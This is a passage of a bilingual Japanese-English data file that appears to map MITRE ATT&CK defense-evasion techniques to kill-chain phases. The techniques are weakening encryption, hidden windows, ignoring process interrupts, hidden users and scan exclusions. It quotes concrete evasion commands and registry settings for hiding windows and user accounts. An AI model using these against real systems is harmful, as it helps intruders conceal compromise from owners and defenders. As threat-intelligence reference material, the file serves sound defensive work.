Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1600,暗号化の弱体化,Weaken Encryption,"攻撃者は、データ通信を保護するはずの暗号化をバイパスするために、ネットワークデバイスの暗号化機能を侵害する可能性があります。(引用: Cisco Synful Knock Evolution)

暗号化は、送信されるネットワークトラフィックを保護して、その機密性（不正な開示からの保護）と完全性（不正な変更からの保護）を維持するために使用できます。暗号化暗号は、平文メッセージを暗号文に変換するために使用され、関連する復号鍵なしで解読するには計算量が多くなる可能性があります。通常、鍵が長いほど、暗号解読（鍵なしの復号）のコストが増加します。

攻撃者は、ネットワークトラフィックの暗号化を実行するデバイスを侵害して操作できます。例えば、[システムイメージの変更](https://attack.mitre.org/techniques/T1601)、[鍵空間の削減](https://attack.mitre.org/techniques/T1600/001)、[暗号化ハードウェアの無効化](https://attack.mitre.org/techniques/T1600/002)などの動作を通じて、攻撃者はデバイスがネットワークトラフィックを安全に暗号化する能力に悪影響を与えたり、排除したりすることができます。これにより、不正な開示のリスクが高まり、データ操作、認証情報アクセス、または収集の取り組みが容易になる可能性があります。(引用: Cisco Blog Legacy Device Attacks)","Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)

Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.

Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",T1600.001,鍵空間の削減,Reduce Key Space,"攻撃者は、暗号化された通信の暗号強度を低下させることにより、ネットワーク経由で送信されるデータを復号するために必要な労力のレベルを低減する可能性があります。(引用: Cisco Synful Knock Evolution)

攻撃者は、ソフトウェアが平文を暗号文に変換するために使用する鍵サイズを（例えば、数百または数千バイトからわずか数バイトに）削減することにより、侵害されたネットワークデバイス上の暗号化ソフトウェアを弱体化させることができます。その結果、攻撃者は鍵なしで保護された情報を復号するために必要な労力を劇的に削減します。

攻撃者は、[システムイメージの変更](https://attack.mitre.org/techniques/T1601)を通じてシステムに導入された[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)の特殊なコマンドを使用して、使用される鍵サイズやその他の暗号化パラメータを変更し、デバイスの構成を変更する可能性があります。(引用: Cisco Blog Legacy Device Attacks)","Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)

Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.

Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1600,暗号化の弱体化,Weaken Encryption,"攻撃者は、データ通信を保護するはずの暗号化をバイパスするために、ネットワークデバイスの暗号化機能を侵害する可能性があります。(引用: Cisco Synful Knock Evolution)

暗号化は、送信されるネットワークトラフィックを保護して、その機密性（不正な開示からの保護）と完全性（不正な変更からの保護）を維持するために使用できます。暗号化暗号は、平文メッセージを暗号文に変換するために使用され、関連する復号鍵なしで解読するには計算量が多くなる可能性があります。通常、鍵が長いほど、暗号解読（鍵なしの復号）のコストが増加します。

攻撃者は、ネットワークトラフィックの暗号化を実行するデバイスを侵害して操作できます。例えば、[システムイメージの変更](https://attack.mitre.org/techniques/T1601)、[鍵空間の削減](https://attack.mitre.org/techniques/T1600/001)、[暗号化ハードウェアの無効化](https://attack.mitre.org/techniques/T1600/002)などの動作を通じて、攻撃者はデバイスがネットワークトラフィックを安全に暗号化する能力に悪影響を与えたり、排除したりすることができます。これにより、不正な開示のリスクが高まり、データ操作、認証情報アクセス、または収集の取り組みが容易になる可能性があります。(引用: Cisco Blog Legacy Device Attacks)","Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)

Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.

Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",T1600.002,暗号化ハードウェアの無効化,Disable Crypto Hardware,"攻撃者はネットワークデバイスの専用ハードウェア暗号化を無効にし、ソフトウェア暗号化の弱点を利用して、送信データの収集、操作、および持ち出しに関わる労力を削減する可能性があります。

ルーター、スイッチ、ファイアウォールなどの多くのネットワークデバイスは、ネットワーク全体の安全な送信のためにネットワークトラフィックの暗号化を実行します。多くの場合、これらのデバイスには、暗号化プロセスの速度を大幅に向上させ、悪意のある改ざんを防ぐための特別な専用暗号化ハードウェアが装備されています。攻撃者がそのようなデバイスを制御すると、例えば[システムイメージの変更](https://attack.mitre.org/techniques/T1601)を使用して専用ハードウェアを無効にし、汎用プロセッサで暗号化を実行するためにソフトウェアの使用を強制する可能性があります。これは通常、ソフトウェアの暗号強度を弱める攻撃（例えば、[鍵空間の削減](https://attack.mitre.org/techniques/T1600/001)）と組み合わせて使用されます。(引用: Cisco Blog Legacy Device Attacks)","Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.

Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.003,隠しウィンドウ,Hidden Window,"攻撃者は、ユーザーの目から悪意のあるアクティビティを隠すために隠しウィンドウを使用する可能性があります。場合によっては、アプリケーションが操作を実行するときに通常表示されるウィンドウを非表示にすることができます。これは、管理タスクを実行するときにユーザーの作業環境を妨害しないようにするためにシステム管理者が利用する場合があります。

攻撃者はこれらの機能を悪用して、システム上の攻撃者のアクティビティをユーザーに警告しないように、他の方法では表示されるウィンドウをユーザーから隠す可能性があります。(引用: Antiquated Mac Malware)

macOSでは、アプリケーションの実行方法に関する構成はプロパティリスト（plist）ファイルにリストされています。これらのファイルのタグの1つに<code>apple.awt.UIElement</code>があり、これによりJavaアプリケーションはアプリケーションのアイコンがDockに表示されるのを防ぐことができます。これの一般的な使用法は、アプリケーションがシステムトレイで実行されるが、Dockにも表示されたくない場合です。

同様に、Windowsには、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript、[Visual Basic](https://attack.mitre.org/techniques/T1059/005)などのスクリプト言語に、ウィンドウを非表示にするためのさまざまな機能があります。この一例は、<code>powershell.exe -WindowStyle Hidden</code>です。(引用: PowerShell About 2019)

Windowsレジストリを編集して、現在のユーザーからアプリケーションウィンドウを非表示にすることもできます。例えば、`HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe`レジストリキーの`WindowPosition`サブキーを最大値に設定することにより、PowerShellウィンドウは画面外で開き、非表示になります。(引用: Cantoris Computing)

さらに、Windowsは、独自の対応する<code>explorer.exe</code>プロセスを持つ非表示のデスクトップウィンドウを作成できる`CreateDesktop()` APIをサポートしています。(引用: Hidden VNC)(引用: Anatomy of an hVNC Attack) 非表示のVNC（hVNC）セッションなど、非表示のデスクトップウィンドウで実行されているすべてのアプリケーションは、他のデスクトップウィンドウからは見えません。","Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)

On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)

The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)

In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.011,プロセス割り込みの無視,Ignore Process Interrupts,"攻撃者は、プロセス割り込み信号から隠れるコマンドを実行することで、防御メカニズムを回避する可能性があります。多くのオペレーティングシステムは、プロセス動作を制御するためのメッセージを配信するために信号を使用します。コマンドインタプリタには、アクティブセッションのユーザーがログオフしたときなど、エラーやその他のハングアップを無視する特定のコマンド/フラグが含まれていることがよくあります。(引用: Linux Signal Man) これらの割り込み信号は、指定された実行中のプロセスを一時停止または終了させるために、防御ツールやアナリストによって使用される場合もあります。

攻撃者は、`nohup`、[PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`、またはハングアップの影響を受けない可能性のある同様のコマンドを使用してプロセスを呼び出す可能性があります。(引用: nohup Linux Man)(引用: Microsoft PowerShell SilentlyContinue) これにより、ユーザーのログオフやC2ネットワーク接続の終了など、通常は実行を終了させるシステムイベントを通じて、悪意のあるコマンドやマルウェアが実行を継続できるようになる可能性があります。

プロセス割り込み信号から隠れることでマルウェアは実行を継続できますが、[トラップ](https://attack.mitre.org/techniques/T1546/005)とは異なり、プロセスが実際に終了されると再呼び出しされないため、[永続性](https://attack.mitre.org/tactics/TA0003)は確立されません。","Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.

Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.

Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.002,隠しユーザー,Hidden Users,"攻撃者は、作成または変更したユーザーアカウントの存在を隠すために隠しユーザーを使用する可能性があります。管理者は、特定のシステムに多数のユーザーアカウントがある場合や、他のユーザーから管理者アカウントやその他の管理アカウントを隠したい場合に、ユーザーを非表示にすることを望む場合があります。

macOSでは、攻撃者はplistファイル、フォルダ属性、およびユーザー属性を操作することにより、ユーザーを作成または変更して非表示にすることができます。ユーザーがログイン画面やシステム環境設定に表示されないようにするために、攻撃者はユーザーIDを500未満に設定し、<code>/Library/Preferences/com.apple.loginwindow</code> plistファイルのキー値<code>Hide500Users</code>を<code>TRUE</code>に設定できます。(引用: Cybereason OSX Pirrit) すべてのユーザーにはユーザーIDが関連付けられています。<code>Hide500Users</code>キー値が<code>TRUE</code>に設定されている場合、ユーザーIDが500未満のユーザーはログイン画面やシステム環境設定に表示されません。コマンドラインを使用して、攻撃者は<code>dscl</code>ユーティリティを使用して<code>IsHidden</code>属性を<code>1</code>に設定することにより、非表示のユーザーアカウントを作成できます。攻撃者はまた、<code>chflags</code>を非表示に変更することにより、ユーザーのホームフォルダを非表示にすることもできます。(引用: Apple Support Hide a User Account)

攻撃者は同様にWindowsでユーザーアカウントを非表示にする可能性があります。攻撃者は、特定のユーザーに対して<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code>レジストリキーの値を<code>0</code>に設定して、そのユーザーがログオン画面に表示されないようにすることができます。(引用: FireEye SMOKEDHAM June 2021)(引用: US-CERT TA18-074A)

Linuxシステムでは、攻撃者はログイン画面（グリーターとも呼ばれる）からユーザーアカウントを非表示にする可能性があります。攻撃者が使用する方法は、ディストリビューションが現在使用しているディスプレイマネージャーによって異なります。例えば、GNOMEディスプレイマネージャー（GDM）を使用しているUbuntuシステムでは、<code>gsettings</code>コマンドを使用してグリーターからアカウントを非表示にすることができます（例：<code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>）。(引用: Hide GDM User Accounts) ディスプレイマネージャーは特定のディストリビューションに固定されておらず、ユーザーまたは攻撃者によって変更される可能性があります。","Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.

In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account)

Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)

On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.012,ファイル/パスの除外,File/Path Exclusions,"攻撃者は、ウイルス対策（AV）スキャンやその他の防御機能から除外された特定のフォルダやファイル名にファイルベースのアーティファクトを書き込むことで、それらを隠そうとする可能性があります。AVやその他のファイルベースのスキャナには、パフォーマンスを最適化し、アプリケーションのインストールと正当な使用を容易にするための除外が含まれていることがよくあります。これらの除外は状況に応じたものである場合もありますが（例えば、特定の発動イベント/アラートに応じてスキャンが開始されるなど）、信頼できる正当なものと見なされる特定のフォルダやファイルを参照するハードコードされた文字列であることもよくあります。(引用: Microsoft File Folder Exclusions)

